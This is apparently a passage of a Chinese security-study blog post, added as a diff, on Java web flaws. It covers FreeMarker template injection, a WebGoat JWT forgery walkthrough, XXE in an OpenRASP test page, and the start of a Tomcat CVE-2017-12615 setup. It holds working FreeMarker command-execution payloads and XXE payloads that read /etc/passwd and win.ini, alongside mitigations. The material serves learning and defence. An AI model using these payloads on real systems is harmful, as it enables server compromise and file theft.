+                <span class="token class-name">Throwable</span> var6 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+
+                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+                    <span class="token class-name">Reader</span> execReader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>execOut<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+                    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> bytes_read <span class="token operator">=</span> execReader<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span> bytes_read <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> bytes_read <span class="token operator">=</span> execReader<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                        aOutputBuffer<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> bytes_read<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">&#125;</span>
+                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var18<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                    var6 <span class="token operator">=</span> var18<span class="token punctuation">;</span>
+                    <span class="token keyword">throw</span> var18<span class="token punctuation">;</span>
+                <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span>execOut <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                        <span class="token keyword">if</span> <span class="token punctuation">(</span>var6 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+                                execOut<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var17<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                                var6<span class="token punctuation">.</span><span class="token function">addSuppressed</span><span class="token punctuation">(</span>var17<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                            <span class="token punctuation">&#125;</span>
+                        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+                            execOut<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token punctuation">&#125;</span>
+                    <span class="token punctuation">&#125;</span>
+
+                <span class="token punctuation">&#125;</span>
+            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var20<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TemplateModelException</span><span class="token punctuation">(</span>var20<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+
+            <span class="token keyword">return</span> aOutputBuffer<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>其中有一个<code>exec</code>方法其中使用了<code>Process exec = Runtime.getRuntime().exec(aExecute);</code>就可以进行命令执行</p>
+<blockquote>
+<p>assign指令：主要是用于为该模板页面创建或者替换一个顶层变量</p>
+</blockquote>
+<p>我们<code>new</code>一个<code>freemarker.template.utility.Execute</code>类使用其<code>exec</code>方法</p>
+<p>payload:</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span>#assign value<span class="token operator">=</span><span class="token string">"freemarker.template.utility.Execute"</span><span class="token operator">?</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span>$<span class="token punctuation">&#123;</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>同样阅读源码可以发现也有其他可以执行恶意代码的类</p>
+<ol>
+<li><p><code>ObjectConstructor</code>类</p>
+<p><img src="image-20220117204448845.png" alt="image-20220117204448845" loading="lazy"></p>
+<p>第一个参数是加载的类名，第二个参数为执行的命令</p>
+<p>payload:</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span>#assign value<span class="token operator">=</span><span class="token string">"freemarker.template.utility.ObjectConstructor"</span><span class="token operator">?</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span>$<span class="token punctuation">&#123;</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token string">"java.lang.ProcessBuilder"</span><span class="token punctuation">,</span><span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li><p><code>JythonRuntime</code>类</p>
+<p><img src="image-20220117212929376.png" alt="image-20220117212929376" loading="lazy"></p>
+<p>payload:</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span>#assign value<span class="token operator">=</span><span class="token string">"freemarker.template.utility.JythonRuntime"</span><span class="token operator">?</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token annotation punctuation">@value</span><span class="token operator">></span><span class="token keyword">import</span> <span class="token namespace">os</span><span class="token punctuation">;</span>os<span class="token punctuation">.</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span><span class="token annotation punctuation">@value</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li><p><code>Execute</code>类</p>
+<p>见上面所述</p>
+</li>
+</ol>
+<p>这种方式所利用的类都是实现了<code>TemplateModel</code>接口</p>
+<p><strong>防御方法：</strong></p>
+<ul>
+<li>使用<code>Configuration.setNewBuiltinClassResolver(TemplateClassResolver)</code>或者设置<code>new_builtin_class_resovlver</code>来限制对这个类的访问</li>
+<li>使用解析器：<ul>
+<li><strong>UNRESTRICTED_RESOLVER</strong>：简单地调用<code>ClassUtil.forName(String)</code>。</li>
+<li><strong>SAFER_RESOLVER</strong>：和第一个类似，但禁止解析<code>ObjectConstructor</code>，<code>Execute</code>和<code>freemarker.template.utility.JythonRuntime</code>。</li>
+<li><strong>ALLOWS_NOTHING_RESOLVER</strong>：禁止解析任何类。</li>
+</ul>
+</li>
+</ul>
+<h6 id="api内建函数的利用"><a href="#api内建函数的利用" class="headerlink" title="api内建函数的利用"></a><code>api</code>内建函数的利用</h6><p><strong>使用条件: 配置项<code>api_buidtin_enabled</code>为<code>true</code>的时候才有效，在2.3.22版本之后默认为false</strong></p>
+<p>使用方法为：<code>value?api.someJavaMethod()</code>，相当于<code>value.someJavaMethod()</code></p>
+<p>可以利用<code>getClassLoader</code>来获取一个类加载器，进而加载恶意类，同样可以使用<code>getResource</code>来读取服务器上的资源文件(通过<code>Class.getResource</code>的返回值来访问<code>URI</code>对象。<code>URI</code>对象包含<code>toURL</code>和<code>create</code>方法，我们通过这两个方法创建任意<code>URI</code>，然后用<code>toURL</code>访问任意URL。)</p>
+<p>payload:</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//加载恶意类</span>
+<span class="token operator">&lt;</span>#assign classLoader<span class="token operator">=</span>object<span class="token operator">?</span>api<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span>$<span class="token punctuation">&#123;</span>classLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"our.desired.class"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
+
+<span class="token comment">//使用getResource类</span>
+<span class="token operator">&lt;</span>#assign uri<span class="token operator">=</span>object<span class="token operator">?</span>api<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getResource</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>#assign input<span class="token operator">=</span>uri<span class="token operator">?</span>api<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token string">"file:///etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">openConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>#assign is<span class="token operator">=</span>input<span class="token operator">?</span>apt<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span>
+FILE<span class="token operator">:</span><span class="token punctuation">[</span><span class="token operator">&lt;</span>#list <span class="token number">0.</span><span class="token number">.99999999</span> as _<span class="token operator">></span>
+     <span class="token operator">&lt;</span>#assign <span class="token keyword">byte</span><span class="token operator">=</span>is<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span>
+     <span class="token operator">&lt;</span>#<span class="token keyword">if</span> <span class="token keyword">byte</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token operator">></span>
+     	<span class="token operator">&lt;</span>#<span class="token keyword">break</span><span class="token operator">></span>
+     <span class="token operator">&lt;</span><span class="token operator">/</span>#<span class="token keyword">if</span><span class="token operator">></span>
+  $<span class="token punctuation">&#123;</span><span class="token keyword">byte</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token operator">/</span>#list<span class="token operator">></span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>OFCMS 1.1.2版本注入漏洞</li>
+</ul>
+<h4 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h4><h5 id="WebGoat的搭建"><a href="#WebGoat的搭建" class="headerlink" title="WebGoat的搭建"></a>WebGoat的搭建</h5><p><a target="_blank" rel="noopener" href="https://hub.docker.com/r/webgoat/goatandwolf">webgoat/goatandwolf - Docker Image | Docker Hub</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/WebGoat/WebGoat">WebGoat/WebGoat: WebGoat is a deliberately insecure application (github.com)</a></p>
+<h5 id="JWT题解"><a href="#JWT题解" class="headerlink" title="JWT题解"></a>JWT题解</h5><p><img src="image-20220121205944669.png" alt="image-20220121205944669" loading="lazy"></p>
+<p>题目要求修改<code>token</code>获得管理员权限，并且重置投票</p>
+<p>点击<code>Reset votes</code>选型，并抓包分析</p>
+<p><img src="image-20220121212408813.png" alt="image-20220121212408813" loading="lazy"></p>
+<p>在白盒审计中查看对应的关键词路径<code>votings</code></p>
+<p><img src="image-20220121212500257.png" alt="image-20220121212500257" loading="lazy"></p>
+<p>在<code>@PostMapping(&#39;JWT/votings&#39;)</code>中有一个返回值为<code>AttackResult</code> 的 <code>resetVotes()</code>方法</p>
+<p><img src="image-20220121212700880.png" alt="image-20220121212700880" loading="lazy"></p>
+<p>这个类是<code>JWTVotesEndpoint</code> 在<code>org.owasp.webgoat.jwt</code>包下</p>
+<p><code>Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken)</code>是为了将传来的<code>accessToken</code>通过<code>JWT_PASSWORD(签名密钥)</code>进行解析操作</p>
+<p><code>Claims claims = (Claims) jwt.getBody()</code>得到其<code>body</code>部分信息</p>
+<p><code>boolean isAdmin = Boolean.valueOf((String) claims.get(&quot;admin&quot;))</code>取出其<code>admin</code>部分的值，如果为<code>true</code>则成功重置投票的进行</p>
+<p><img src="image-20220121214235149.png" alt="image-20220121214235149" loading="lazy"></p>
+<p><code>JWTPASSWORD</code>是使用<code>final</code>修饰的静态常量，值为<code>victory</code>的base64编码，至于<code>access_token</code>从哪里来的呢，我们可以通过注解<code>@CookieValue</code>猜测是从Cookie传来的</p>
+<p><img src="image-20220121220404216.png" alt="image-20220121220404216" loading="lazy"></p>
+<p>可以发现<code>Cookie</code>是在<code>login</code>方法中被创建的</p>
+<p><img src="image-20220121220639128.png" alt="image-20220121220639128" loading="lazy">        </p>
+<p>当用户为<code>Guest</code>的时候，他的<code>access_token</code>为空，而且发送请求之后其返回的<code>lessonCompleted</code>为<code>false</code>，其<code>feedback</code>返回为<code>Not a valid JWT token, please try again</code></p>
+<p>切换用户为<code>Tome</code></p>
+<p><img src="image-20220121220937657.png" alt="image-20220121220937657" loading="lazy"></p>
+<p>其<code>access_token</code>不为空，但是其<code>lessonCompleted</code>仍然为<code>false</code>，其<code>feedback</code>返回为<code>Only an admin user can reset the votes</code></p>
+<p>我们同样可以很容易的发现<code>access_token</code>符合<code>JWT</code>的格式，拿进<a target="_blank" rel="noopener" href="https://jwt.io/">在线网站</a>进行分析</p>
+<p><img src="image-20220121221415779.png" alt="image-20220121221415779" loading="lazy"></p>
+<p>可以发现基本信息都被解析出来了，我们将<code>admin</code>修改为<code>true</code>，并且其<code>secret</code>填入<code>victory</code></p>
+<p>将得到的<code>JWT</code>放入<code>access_token</code>字段，进行重发</p>
+<p><img src="image-20220121222014649.png" alt="image-20220121222014649" loading="lazy"></p>
+<p>成功伪造admin身份</p>
+<h4 id="XML外部实体注入"><a href="#XML外部实体注入" class="headerlink" title="XML外部实体注入"></a>XML外部实体注入</h4><blockquote>
+<p>DTD部分是XXE攻击的关键：它是用于定义普通文本或者特殊字符的快捷方式的变量</p>
+<p>实体分为<code>内部声明实体</code> 和 <code>引用外部实体</code>, 内部声明实体的格式：<code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;</code>，引用外部实体的格式：<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URL/URI&quot;&gt;</code>或者是<code>&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;</code>,在外部实体中，不同编程语言支持不同的协议，Java默认提供对<code>http, https, ftp, file, jar, netdoc, mailto, gopher</code>等协议的支持 </p>
+</blockquote>
+<p>在本地搭建百度OpenRASP的实例</p>
+<p><img src="image-20220228201701750.png" alt="image-20220228201701750" loading="lazy"></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//007-xxe.jsp</span>
+<span class="token operator">&lt;</span><span class="token operator">%</span>@ page contentType<span class="token operator">=</span><span class="token string">"text/html; charset=UTF-8"</span> <span class="token operator">%</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.w3c.dom.*, javax.xml.parsers.*"</span> <span class="token operator">%</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.xml.sax.InputSource"</span> <span class="token operator">%</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.StringReader"</span> <span class="token operator">%</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">%</span>
+    <span class="token class-name">String</span> linux_querystring <span class="token operator">=</span> <span class="token string">"?data=%3C%3F%78%6D%6C%20%76%65%72%73%69%6F%6E%3D%22%31%2E%30%22%20%65%6E%63%6F%64%69%6E%67%3D%22%49%53%4F%2D%38%38%35%39%2D%31%22%3F%3E%3C%21%44%4F%43%54%59%50%45%20%66%6F%6F%20%5B%20%20%20%3C%21%45%4C%45%4D%45%4E%54%20%66%6F%6F%20%41%4E%59%20%3E%20%20%3C%21%45%4E%54%49%54%59%20%78%78%65%20%53%59%53%54%45%4D%20%22%66%69%6C%65%3A%2F%2F%2F%65%74%63%2F%70%61%73%73%77%64%22%20%3E%5D%3E%3C%66%6F%6F%3E%26%78%78%65%3B%3C%2F%66%6F%6F%3E"</span><span class="token punctuation">;</span>
+    <span class="token class-name">String</span> windows_querystring <span class="token operator">=</span> <span class="token string">"?data=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22ISO-8859-1%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%20%20%20%3C%21ELEMENT%20foo%20ANY%20%3E%20%20%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fc%3A%2Fwindows%2Fwin.ini%22%20%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E"</span><span class="token punctuation">;</span>
+    <span class="token class-name">String</span> data <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token class-name">String</span> tmp  <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>data <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+	    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+           <span class="token class-name">DocumentBuilderFactory</span> docFactory <span class="token operator">=</span> <span class="token class-name">DocumentBuilderFactory</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+           <span class="token class-name">DocumentBuilder</span> docBuilder <span class="token operator">=</span> docFactory<span class="token punctuation">.</span><span class="token function">newDocumentBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+           <span class="token class-name">Document</span> doc <span class="token operator">=</span> docBuilder<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputSource</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringReader</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+           <span class="token class-name">NodeList</span> <span class="token class-name">RegistrationNo</span> <span class="token operator">=</span> doc<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"foo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+           tmp <span class="token operator">=</span> <span class="token class-name">RegistrationNo</span><span class="token punctuation">.</span><span class="token function">item</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getFirstChild</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getNodeValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  		<span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+          out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"&lt;pre>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"&lt;/pre>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  		<span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token operator">%</span><span class="token operator">></span>
+<span class="token generics"><span class="token punctuation">&lt;</span>html<span class="token punctuation">></span></span>
+<span class="token generics"><span class="token punctuation">&lt;</span>head<span class="token punctuation">></span></span>
+	<span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token operator">/</span><span class="token operator">></span>
+	<span class="token generics"><span class="token punctuation">&lt;</span>title<span class="token punctuation">></span></span><span class="token number">007</span> XXE 漏洞测试<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span>
+
+<span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span>
+
+<span class="token generics"><span class="token punctuation">&lt;</span>body<span class="token punctuation">></span></span>
+  <span class="token generics"><span class="token punctuation">&lt;</span>h1<span class="token punctuation">></span></span><span class="token number">007</span> <span class="token operator">-</span> 通过XXE读取系统文件<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span>
+
+	<span class="token generics"><span class="token punctuation">&lt;</span>p<span class="token punctuation">></span></span>不正常调用 <span class="token operator">-</span> <span class="token class-name">Linux</span> <span class="token punctuation">(</span>读取 <span class="token operator">/</span>etc<span class="token operator">/</span>passwd<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>
+  <span class="token generics"><span class="token punctuation">&lt;</span>p<span class="token punctuation">></span></span>curl <span class="token string">'&lt;a href="&lt;%=request.getRequestURL()+linux_querystring%>" target="_blank">&lt;%=request.getRequestURL()+linux_querystring%>&lt;/a>'</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>
+
+    <span class="token generics"><span class="token punctuation">&lt;</span>p<span class="token punctuation">></span></span>不正常调用 <span class="token operator">-</span> <span class="token class-name">Windows</span> <span class="token punctuation">(</span>读取 c<span class="token operator">:</span><span class="token operator">/</span>windows<span class="token operator">/</span>win<span class="token punctuation">.</span>ini<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>
+  <span class="token generics"><span class="token punctuation">&lt;</span>p<span class="token punctuation">></span></span>curl <span class="token string">'&lt;a href="&lt;%=request.getRequestURL()+windows_querystring%>" target="_blank">&lt;%=request.getRequestURL()+windows_querystring%>&lt;/a>'</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>
+
+    <span class="token generics"><span class="token punctuation">&lt;</span>p<span class="token punctuation">></span></span>节点内容<span class="token operator">:</span> <span class="token operator">&lt;</span><span class="token operator">%=</span> tmp <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>
+    <span class="token generics"><span class="token punctuation">&lt;</span>p<span class="token punctuation">></span></span><span class="token punctuation">(</span>有漏洞会看到文件内容<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>对其中的字符串windows_querystring进行url解码可以得到</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> unquote
+
+tmp <span class="token operator">=</span> <span class="token string">"?data=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22ISO-8859-1%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%20%20%20%3C%21ELEMENT%20foo%20ANY%20%3E%20%20%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fc%3A%2Fwindows%2Fwin.ini%22%20%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E"</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>unquote<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment"># ?data=&lt;?xml version="1.0" encoding="ISO-8859-1"?>&lt;!DOCTYPE foo [   &lt;!ELEMENT foo ANY >  &lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]>&lt;foo>&amp;xxe;&lt;/foo></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>漏洞成因就是因为使用了<code>javax.xml.parsers.DocumentBuilder</code>，但是并没有禁用外部实体</p>
+<p>防御方式：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">DocumentBuilderFactory</span> dbf <span class="token operator">=</span> <span class="token class-name">DocumentBuilderFactory</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+dbf<span class="token punctuation">.</span><span class="token function">setFeature</span><span class="token punctuation">(</span><span class="token string">"http://apache.org/xml/features/disallow-doctype-decl"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">DocumentBuilder</span> db <span class="token operator">=</span> dbf<span class="token punctuation">.</span><span class="token function">newDocumentBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token class-name">Document</span> document <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h5 id="Dos攻击"><a href="#Dos攻击" class="headerlink" title="Dos攻击"></a>Dos攻击</h5><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token comment">&lt;!--payload--></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="image-20220228212134770.png" alt="image-20220228212134770" loading="lazy"></p>
+<h4 id="安全配置错误"><a href="#安全配置错误" class="headerlink" title="安全配置错误"></a>安全配置错误</h4><h5 id="Tomcat任意文件写入-CVE-2017-12615"><a href="#Tomcat任意文件写入-CVE-2017-12615" class="headerlink" title="Tomcat任意文件写入(CVE-2017-12615)"></a>Tomcat任意文件写入(CVE-2017-12615)</h5><h6 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h6><p>任意文件写入，主要影响的是Tomcat的7.0.0-7.0.81这几个版本</p>
+<h6 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h6><p>使用<code>vulhub</code>搭建<code>CVE-2017-12615</code></p>
+<p>修改docker-compose.yml中的端口，添加5005端口</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">version: <span class="token string">'2'</span>
+services:
+ tomcat:
+   build: <span class="token builtin class-name">.</span>
+   ports:
+    - <span class="token string">"8080:8080"</span>
+    - <span class="token string">"5005:5005"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>启动环境并进入，修改<code>tomcat/bin</code>下的<code>catalinna.sh</code>文件</p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh"># 添加
+JAVA_OPTS&#x3D;&quot;$JAVA_OPTS -agentlib:jdwp&#x3D;transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;n,address&#x3D;5005&quot; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="image-20220302133806803.png" alt="image-20220302133806803" loading="lazy"></p>
+<p>然后重启tomcat  <code>./startup.sh</code></p>
+<h6 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h6><p>访问ip:8080</p>
